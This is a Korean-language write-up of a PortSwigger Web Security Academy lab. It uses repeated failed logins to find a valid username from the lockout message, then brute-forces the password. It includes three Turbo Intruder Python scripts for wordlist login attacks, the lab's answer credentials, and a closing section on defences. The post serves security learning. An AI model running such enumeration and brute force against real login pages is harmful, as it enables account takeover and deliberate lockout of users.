+++
date = '2026-07-09T15:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Username enumeration via account lock'
summary = "존재하는 계정만 반복 실패 시 잠기는 점을 이용해 잠금 반응으로 username을 열거하고, 잠금 상태에서도 남는 응답 차이로 비밀번호를 특정하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Username Enumeration", "Account Lock", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)

> ![image.png](/writeup/portswigger/authentication/07/1.png)

이 랩은 username 열거에 취약하며, 계정 잠금을 사용하지만 그 로직에 결함이 있다. 유효한 username을 열거하고 비밀번호를 브루트포스해 계정 페이지에 접근하면 문제가 해결된다. [username 후보](https://portswigger.net/web-security/authentication/auth-lab-usernames)와 [password 후보](https://portswigger.net/web-security/authentication/auth-lab-passwords)가 주어진다.

### Authentication 진단

먼저 username 후보 전체에 한 번씩 요청을 보내 응답 차이를 본다. Turbo Intruder 스크립트는 다음과 같다.

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=3
                           )

    for word in open(r'C:\Users\cas\Desktop\CAS\asset\word.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    table.add(req)
```

하지만 모든 후보의 응답이 동일하다. 한 번의 요청으로는 유효 여부를 구분할 수 없다.

![image.png](/writeup/portswigger/authentication/07/2.png)

문제에 계정 잠금 키워드가 있었으므로, 한 계정에 **반복** 요청을 보내는 쪽으로 방향을 튼다. 존재하지 않는 계정은 잠글 대상이 없어 잠기지 않고, 존재하는 계정만 여러 번 실패 시 잠긴다고 가정할 수 있다. 각 후보를 5회씩 시도하도록 스크립트를 바꾼다.

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=3
                           )

    for word in open(r'C:\Users\cas\Desktop\CAS\asset\word.txt'):
        for i in range(5):
            engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    table.add(req)
```

보편적인 잠금 임계값인 5회로 각 계정을 두들기자, `agenda` 계정에서만 다른 응답보다 긴 응답이 나타난다.

![image.png](/writeup/portswigger/authentication/07/3.png)

응답에 `You have made too many incorrect login attempts. Please try again in 1 minute(s).`가 포함된다 — **잠금이 걸렸다는 것은 곧 잠글 계정이 존재한다는 뜻**이므로 `agenda`가 유효 계정이다.

---

## 익스플로잇

유효 계정을 얻었으니 비밀번호를 브루트포스한다. `X-Forwarded-For`로 잠금 우회를 시도해 보지만 실패한다. 대신 **잠금 상태에서도 비밀번호 유효 여부에 따라 응답이 갈리는지**를 확인하기 위해, 후보 전체를 그대로 대입해 본다.

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=50,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=3
                           )

    for word in open(r'C:\Users\cas\Desktop\CAS\asset\word.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    table.add(req)
```

결과를 보면 password `amanda`에서만 잠금 경고가 붙지 않은 응답이 돌아온다. 잠긴 상태여도 서버는 올바른 비밀번호에 대해 다른 처리를 하며, 그 차이가 정답을 드러낸다.

![image.png](/writeup/portswigger/authentication/07/4.png)

확인한 `agenda:amanda`로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/07/5.png)

---

## 정리

이 랩은 계정 잠금이라는 **방어 기능 자체가 열거 채널**이 되는 역설을 보여 준다. 존재하는 계정만 잠글 수 있으므로, "여러 번 실패시켰을 때 잠기는가"라는 반응이 그 계정의 존재 여부를 그대로 드러낸다. 한 번의 로그인 시도로는 응답이 동일하지만, 잠금이라는 상태 변화를 유도하면 유효 계정만 다르게 반응한다.

두 번째 결함은 잠금 상태에서도 비밀번호 검증 결과가 응답에 남는다는 점이다. 계정이 잠겼다면 어떤 비밀번호를 넣든 동일하게 거부되어야 하는데, 올바른 비밀번호에만 다른 처리를 하는 바람에 잠금이 브루트포스를 막지 못한다. 방어가 절반만 작동한 셈이다.

핵심은 계정 잠금이 열거·브루트포스를 막기는커녕 새로운 오라클을 열 수 있다는 것이다. 견고한 방어라면 잠금 여부를 응답으로 드러내지 않고(유효·무효 계정 모두 동일한 형태로 반환), 잠긴 계정은 비밀번호 정오와 무관하게 완전히 동일하게 처리해야 한다. 계정 잠금은 그 자체로 서비스 거부(공격자가 피해자 계정을 일부러 잠글 수 있음)의 소지도 있어, user rate limiting 같은 대안과 함께 신중히 설계해야 한다. 응답 신호를 이용하는 다른 열거는 [different responses](/write-up/portswigger/authentication/write-up-portswigger---username-enumeration-via-different-responses/)에서 다뤘다.
